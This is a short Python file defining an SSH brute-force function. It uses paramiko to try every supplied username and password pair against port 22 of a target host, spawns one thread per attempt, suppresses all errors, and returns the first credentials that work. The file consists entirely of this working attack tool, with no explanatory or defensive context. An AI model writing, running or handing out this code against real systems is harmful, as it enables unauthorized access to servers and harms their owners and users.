import paramiko
import threading
import time

def ssh_bruteforce(host, usernames, passwords, timeout=2):
    found = threading.Event()
    found_credentials = None

    def try_combination(username, password):
        nonlocal found_credentials
        if found.is_set():
            return

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=22, username=username, password=password, timeout=timeout)
            found_credentials = (username, password)
            found.set()
            client.close()
        except paramiko.AuthenticationException:
            pass
        except Exception:
            pass

    threads = []
    for username in usernames:
        for password in passwords:
            if found.is_set():
                break
            thread = threading.Thread(target=try_combination, args=(username, password))
            threads.append(thread)
            thread.start()
        if found.is_set():
            break

    for thread in threads:
        thread.join()

    return found_credentials
